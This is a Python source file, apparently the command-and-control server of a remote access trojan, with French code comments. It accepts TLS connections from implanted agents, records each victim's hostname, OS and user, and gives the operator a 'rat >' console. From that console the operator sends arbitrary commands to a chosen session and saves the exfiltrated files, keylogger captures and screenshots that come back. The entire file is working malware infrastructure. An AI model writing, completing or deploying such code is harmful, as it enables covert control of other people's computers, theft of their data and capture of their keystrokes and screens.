# écouter sur un port
# accepter connexions
# lancer threads
import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json
import datetime
from rat.server.sessions import SessionManager

logger = setup_logger()


class SSLServer:
    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        self._running = True
        self._server_socket = None
        self.host = host
        self.port = port
        self.chunk_size = chunk_size
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)
        self._sessions = SessionManager()

    def shutdown(self):

        logger.info("Shutdown requested")

        self._running = False

        if self._server_socket:
            self._server_socket.close()

    def connect(self):

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

        self._server_socket = sock

        sock.bind((self.host, self.port))

        sock.listen(5)

        sock.settimeout(1)

        print("Server listening")
        logger.info("Server listening")

        while self._running:

            try:

                conn, addr = sock.accept()

            except socket.timeout:
                continue

            try:

                sconn = self._context.wrap_socket(
                    conn,
                    server_side=True,
                )

                print("Client connected:", addr[0])
                logger.info("Client connected: %s", addr[0])

                data = self._recv_message(sconn)

                client_info = json.loads(data)

                logger.info(
                    "New agent: %s | %s | %s | %s",
                    client_info["hostname"],
                    client_info["os"],
                    client_info["user"],
                    client_info["release"],
                )

                session = self._sessions.add_session(
                    sconn,
                    client_info,
                )

                Thread(
                    target=self._handle_client,
                    args=(session,),
                    daemon=True,
                ).start()

            except ssl.SSLError:

                print("SSL handshake failed")
                logger.error("SSL handshake failed")

        logger.info("Server stopped")

        sock.close()

    def _recv(self, sock):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:
                    print("Client disconnected")
                    logger.warning("Client disconnected")
                    break

                print(data.decode())

        except ConnectionResetError:

            print("Client forcibly closed connection")
            logger.warning("Client forcibly closed connection")

        except ssl.SSLError:

            print("SSL error")
            logger.error("SSL error")
        except Exception as e:

            print(f"Error: {e}")

        finally:

            sock.close()

    def _save_download(self, response):

        try:

            lines = response.split("\n")

            if lines[0] != "DOWNLOAD":
                print(response)
                return

            if lines[1] != "OK":
                print("\n".join(lines[1:]))
                return

            content = "\n".join(lines[2:])

            ct = datetime.datetime.now()
            filename = "downloaded_file_" + ct.strftime("%Y%m%d_%H%M%S")

            with open(filename, "w") as f:
                f.write(content)

            print(f"File saved: {filename}")

        except Exception as e:

            print("Download save error:", e)

    def _save_keylog(self, response):

        try:

            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            content = "\n".join(lines[2:])

            if not content:
                print("No keystrokes captured")
                return

            ct = datetime.datetime.now()
            filename = "keylogger_file_" + ct.strftime("%Y%m%d_%H%M%S")

            with open(filename, "w") as f:
                f.write(content)

            print(f"Keylogger saved: {filename}")

        except Exception as e:

            print("Keylogger save error:", e)

    def _save_screenshot(self, response):

        import base64
        from datetime import datetime

        try:

            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            encoded = "".join(lines[2:])

            image_bytes = base64.b64decode(encoded)

            filename = f"screenshot_" f"{datetime.now().timestamp()}.png"

            with open(filename, "wb") as f:

                f.write(image_bytes)

            print(f"Screenshot saved: {filename}")

        except Exception as e:

            print("Screenshot save error:", e)

    def _recv_message(self, sock):

        size_data = b""

        while not size_data.endswith(b"\n"):

            chunk = sock.recv(1)

            if not chunk:
                return None

            size_data += chunk

        size = int(size_data.strip())

        buffer = b""

        while len(buffer) < size:

            chunk = sock.recv(self.chunk_size)

            if not chunk:
                return None

            buffer += chunk

        return buffer.decode(errors="ignore")

    def _print_sessions(self):

        sessions = self._sessions.list_sessions()

        if not sessions:
            print("No active sessions")

            return

        print("\nID   Hostname        OS        User")

        for s in sessions:
            print(f"{s.id:<4}" f"{s.hostname:<15}" f"{s.os:<10}" f"{s.user}")

    def _handle_client(self, session):

        logger.info("Session %s handler started", session.id)

        try:

            while self._running:

                if session.sock.fileno() == -1:
                    break

                # dormir pour ne pas brûler le CPU
                import time

                time.sleep(1)

        finally:

            logger.info("Session %s disconnected", session.id)

            self._sessions.remove_session(session.id)

            try:
                session.sock.close()
            except Exception as e:
                e = str(e)
                pass

    def _handle_kill(self, command):

        try:

            parts = command.split()

            if len(parts) != 2:
                print("Usage: kill <session_id>")
                return

            session_id = int(parts[1])

        except ValueError:

            print("Invalid session id")
            return

        session = self._sessions.get_session(session_id)

        if not session:
            print("Session not found")
            return

        sock = session.sock

        try:
            data = b"exit"

            size = str(len(data)).encode() + b"\n"

            sock.sendall(size)

            sock.sendall(data)

        except Exception:

            pass

        try:

            sock.close()

        except Exception as e:
            e = str(e)
            pass

        self._sessions.remove_session(session_id)

        print(f"Session {session_id} terminated")

        logger.info("Session %s killed", session_id)

    # ------------- Main interactive console -------------
    def run_console(self):

        while self._running:

            try:

                command = input("rat > ").strip()

            except EOFError:

                print()
                self.shutdown()
                break

            if not command:
                continue

            if command == "exit":
                self.shutdown()

                break

            if command == "sessions":
                self._print_sessions()

                continue

            if command.startswith("use "):
                self._handle_use(command)

                continue
            if command.startswith("kill"):
                self._handle_kill(command)
                continue

            self._send_to_active_session(command)

    def _send_to_active_session(self, command):

        session = self._sessions.get_active()

        if not session:
            print("No active session. " "Use 'sessions' then 'use <id>'")
            return

        sock = session.sock

        try:

            data = command.encode()

            size = str(len(data)).encode() + b"\n"

            sock.sendall(size)

            sock.sendall(data)

            logger.info(
                "Command sent to session %s: %s",
                session.id,
                command,
            )

            response = self._recv_message(sock)

            if not response:
                print("Client disconnected")

                self._sessions.remove_session(session.id)

                return

            self._handle_response(response)

        except Exception as e:

            print("Send error:", e)

    def _handle_response(self, response):

        lines = response.split("\n")

        response_type = lines[0]

        if response_type == "DOWNLOAD":

            self._save_download(response)

        elif response_type == "KEYLOG":

            self._save_keylog(response)

        elif response_type == "SCREENSHOT":

            self._save_screenshot(response)

        else:

            print(response)

        if response_type not in (
            "SCREENSHOT",
            "DOWNLOAD",
            "KEYLOG",
        ):
            logger.info("Client responded: %s", response)
        else:
            logger.info("Client responded with %s", response_type)

    def _handle_use(self, command):

        try:

            parts = command.split()

            if len(parts) != 2:
                print("Usage: use <session_id>")

                return

            session_id = int(parts[1])

        except ValueError:

            print("Invalid session id")

            return

        if self._sessions.set_active(session_id):

            print(f"Switched to session {session_id}")

            logger.info(
                "Active session set to %s",
                session_id,
            )

        else:

            print("Session not found")


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
